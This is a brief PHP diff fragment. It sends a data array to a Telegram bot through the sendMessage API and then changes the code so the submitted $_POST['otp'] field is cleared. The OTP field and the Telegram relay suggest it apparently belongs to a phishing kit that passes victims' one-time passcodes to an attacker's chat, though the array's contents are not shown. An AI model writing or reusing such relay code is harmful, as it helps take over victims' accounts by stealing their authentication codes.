@@ -15,4 +15,4 @@ $data = [
 file_get_contents("https://api.telegram.org/bot" . $Api_Token . "/sendMessage?" . http_build_query($data));
 
 //comment this if you want blank
-//$_POST['otp'] = NULL;
+$_POST['otp'] = NULL;
